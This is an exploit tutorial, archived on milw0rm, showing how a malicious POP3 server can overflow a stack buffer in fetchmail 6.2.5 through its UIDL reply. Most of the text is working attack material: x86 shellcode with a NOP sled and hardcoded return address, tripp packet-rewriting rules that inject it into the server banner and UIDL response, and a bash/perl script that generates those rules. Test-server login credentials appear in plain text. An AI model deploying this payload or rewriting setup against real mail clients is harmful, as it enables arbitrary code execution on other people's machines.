@@ -1,0 +1,247 @@
+Remote exploiting through payload rewriting
+
+
+
+This example shows how to use payload rewriting to exploit remote buffer
+overflow vulnerabilities. 
+In this case of study we'll analyze the classical buffer overflow wich can be 
+triggered by passing a large amount of data when a small one is expected. 
+Fetchmail 6.2.5 fails to perform an adequate boundary check on user-supplied 
+input when it copies the output of the UIDL command into the stack so it can
+lead to overflowing a finite-sized buffer. A malicious pop3 server could exploit 
+this version of fetchmail by sending an especially crafted response to UIDL 
+command containing an exploit-payload.
+
+
+First lets take a look at a standard pop3d behaviour:
+
+root@sd~# telnet pop3.papuasia.org 110
++OK Dovecot ready
+user poplix
++OK 
+pass dilithium
++OK logged in
+STAT
++OK 8 7035
+UIDL 1
++OK 1 0000685843e0fc41
+quit
+
+
+This is how pop3.papuasia.org responds to initial pop3 commands.
+
+
+
+
+
+Exploiting fetchmail:
+
+Now I'd like to spend a few words on the exploitation process. Due to the 
+sscanf behaviour we cannot put our shellcode on the overflowed buffer, so we 
+have to insert it into another memory area. A good place to save the shellcode 
+is the buffer used to store the server banner. Here the server banner is 
+"Dovecot ready" so we need to replace it with NOPs and shellcode. When shellcode 
+is stored in memory, we're able to proceed with the exploitation process making 
+eip point to our code.
+Note that if there are less that 8 mails on the server, fetchmail will not call
+the vulnerable function.
+
+
+Here is pop3.papuasia.org patched to be able to exploit fetchmail:
+
+root@sd~# telnet pop3.papuasia.org 110
++OK <NOP NOP NOP .... shellcode>
+user poplix
++OK
+pass dilithium
++OK logged in
+STAT
++OK 8 7035
+UIDL 1
++OK 1 <AAAAAAAAAAAAAAAAAAAAAAAAA...RET>
+quit
+
+
+It sounds like a really strange behaviour for a pop3 server... lets try it
+against fetchmail
+
+root@sd~# cat .fetchmailrc
+poll pop3.papuasia.org protocol pop3 username "poplix" password "dilithium"
+
+root@sd~/fetchmail-6.2.5# ./fetchmail --fastuidl 1 -k
+ABOUT-NLS          driver.c                 md5.h          rpa.c
+COPYING            driver.o                 md5c.c         rpa.o
+FAQ                env.c                    md5c.o         sink.c
+FEATURES           env.o                    md5ify.c       sink.o
+INSTALL            etrn.c                   md5ify.o       smb.h
+MANIFEST           etrn.o                   memmove.c      smbbyteorder.h
+.....
+root@sd~#/fetchmail-6.2.5#
+
+
+
+As we can see, this malicious pop3 server has succesfully exploited fetchmail 
+making this vulnerable program execute /bin/ls. Now the idea is to use 
+payload rewriting to perform the same task. In order to do that we have to
+confiure tripp to rewrite parts of our pop3 session's payload. First we 
+need to repalace the first occurrence of "Dovecot" with the shellcode and then
+replace the UID of the first mail (0000685843e0fc41) with our exploit-payload.
+
+
+#Beginning of tripp rules file used to exploit fetchmail 6.2.5
+
+OUT ( tcp.sport = '110' ) rewrite payload (
+'Dovecot'=
+'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x1f\x5e\x89\x76\x08\x31\xc0
+\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80
+\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls'*1,
+'0000685843e0fc41' =
+'TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
+TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT
+TTTTTTTTTTTTTTTTTTTTTTTTTTTTT\x1e\xd6\xff\xbf'*1
+);
+
+
+
+Now we should execute tripp on the pop3 server:
+
+root@papuasia.org~# tripp -i eth0 -g 10.0.0.138 -f rules_file
+rewriter for incoming traffic started
+rewriter for outgoing traffic started
+
+
+Lets check the pop3 behaviour:
+
+root@sd~# telnet pop3.papuasia.org 110
++OK <NOP NOP NOP .... shellcode> ready
++OK
+user poplix
++OK
+pass dilithium
++OK logged in
+UIDL 1
++OK 1 <TTTTTTTTTTTTTTTTTTTTTTTTTT...RET>
+quit
+
+
+
+Now we should be able to exploit fetchmail:
+
+root@sd~#/fetchmail-6.2.5# ./fetchmail --fastuidl 1 -k
+ABOUT-NLS          driver.c                 md5.h          rpa.c
+COPYING            driver.o                 md5c.c         rpa.o
+FAQ                env.c                    md5c.o         sink.c
+FEATURES           env.o                    md5ify.c       sink.o
+INSTALL            etrn.c                   md5ify.o       smb.h
+MANIFEST           etrn.o                   memmove.c      smbbyteorder.h
+.....
+root@sd~/fetchmail-6.2.5#
+
+
+
+Eureka, we've succesfully exploited fetchmail with a standard pop3 server and 
+one tripp's rule only.
+
+
+
+
+
+
+Tripp rules:
+
+With the rules file above we must know the mail UID in order to replace it with
+the exploit-payload. Generally this is not a problem because we are the
+mailserver owners, so we can get all UIDs. Anyway a better method consists in 
+setting up an arbitrary payload instead of rewrite parts of it. As we can see,
+the reply to "UIDL 1" command is "+OK 1 0000685843e0fc41\r\n", so we can
+match any packets containing "+OK 1 " and then set its payload to 
+"+OK 1 TTTTTTTTTTTTTTTT...RET\r\n". In the same manner we can match any packet
+containing "Dovecot" (or equal to "+OK Dovecot ready\r\n") and set its payload 
+to "+OK NOP NOP NOP....shellcode\r\n"
+
+
+example:
+OUT(tcp.sport='110', payload ^ 'Dovecot') set (payload = '+OK \x90\x90...\r\n');
+OUT(tcp.sport='110', payload ^ '+OK 1 ') set (payload = '+OK 1 TTTTTT....\r\n');
+
+
+
+It's also possible to run tripp on the same machine as fetchmail, in this case
+the rewrite must be applied to the IN chain.
+
+
+
+
+
+
+Payload generation:
+
+A good way to generate the payload is using bash and perl. The rules file we 
+used to exploit fetchmail has been generate with the following script:
+
+
+#!/bin/bash
+
+# IN to use on client machine; OUT to use on server machine
+CHAIN="OUT"
+
+#shellcode
+SC="\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\
+\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\
+\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
+
+#return addr 0xbfffd61e
+RET="\x1e\xd6\xff\xbf"
+
+
+#nops and shellcode
+EXEC="$(perl -e 'print "\\x90"x100')$SC"
+
+#overflow and return addr
+OVERF="$(perl -e 'print "T"x172')$RET"
+
+#UID of the first mail
+FUID="0000685843e0fc41"
+
+
+#write rules file that uses payload rewrite
+echo "$CHAIN ( tcp.sport='110') rewrite payload(\
+'$FUID'   = '$OVERF'*1,\
+'Dovecot'= '$EXEC'*1);" > rules_file_rewrite
+
+
+#write rules file that uses set payload
+echo "$CHAIN(tcp.sport='110', payload ^ 'Dovecot')\
+ set (payload = '+OK $EXEC\r\n');\
+$CHAIN(tcp.sport='110', payload ^ '+OK 1 ')\
+ set (payload = '+OK 1 $OVERF\r\n');" > rules_file_set
+
+
+#EOF
+
+
+
+Anyway it's possible to lunch tripp directly from the script:
+
+tripp -i eth0 -g 10.0.0.138 -r "$CHAIN ( tcp.sport='110') rewrite payload(\
+'$FUID'   = '$OVERF'*1,\
+'Dovecot'= '$EXEC'*1);"
+
+
+
+
+
+
+References:
+
+Fetchmail 6.2.5 exploit for Bugtraq ID: 14349 
+	(http://www.securityfocus.com/archive/1/409633/30/0/threaded)
+
+http://tripp.dynalias.org
+
+# milw0rm.com [2006-08-01]
